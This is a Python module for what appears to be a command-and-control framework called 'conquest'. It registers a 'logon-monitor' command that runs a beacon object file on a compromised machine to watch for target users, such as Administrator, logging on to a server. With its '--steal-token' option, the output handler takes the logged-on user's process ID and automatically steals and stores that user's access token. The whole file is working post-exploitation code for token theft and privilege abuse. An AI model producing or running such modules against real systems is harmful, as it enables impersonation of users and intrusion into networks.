import conquest
import os.path
import re

SCRIPT_DIR = os.path.dirname(__file__)

def _logonMonitor(agentId, cmdline, args): 
    interval = conquest.get_int(args, 0)
    user = conquest.get_string(args, 1)
    server = conquest.get_string(args, 2)
    steal = conquest.get_bool(args, 3) # Toggle output handler

    bof = os.path.join(SCRIPT_DIR, f"logon-monitor.{conquest.arch(agentId)}.o")
    params = conquest.bof_pack("iZZ", [
        interval,       # i: Polling interval  
        user,           # Z: Target users
        server          # Z: Target server
    ])

    dll = conquest.resources_root() + f"/async-bof-loader/dist/async-bof.{conquest.arch(agentId)}.dll"
    if not os.path.exists(dll): 
        raise FileNotFoundError(f"Async BOF DLL not found: {dll}")

    if os.path.exists(bof): 
        conquest.execute_alias(agentId, cmdline, f"dll {dll} Run {conquest.async_bof_pack(bof, params)}", steal) 
    else: 
        conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)

def _logonMonitorOutput(agentId, output):
    conquest.output(agentId, output)

    # Retrieve PID and store access token in vault
    match = re.search(r'Process\s+:\s+(\d+)/', output)
    if match:
        pid = match.group(1)
        conquest.execute_command(agentId, f"steal-token {pid} --store")

cmd_logonMonitor = (
    conquest.createCommand(name="logon-monitor", description="Notify when a user logs on to a target system (async).", example="logon-monitor --server web01 --user Administrator",
                           message="Tasked agent to notify when user logs on to a target system.", mitre=[])
            .addFlagInt("--interval", "interval", "Polling interval in seconds (default: 5).", False, 5)
            .addFlagString("--user", "user", "Comma-separated list of target users (default: all users).")
            .addFlagString("--server", "server", "Target system (default: local computer). Requires Administrator or Remote Desktop privileges on the remote computer.")
            .addFlagBool("--steal-token", "Steal and store the access token of the logged on user. Requires NT AUTHORITY\\SYSTEM privileges.")
            .setHandler(_logonMonitor)
            .setOutputHandler(_logonMonitorOutput)
).registerToGroup("situational awareness")

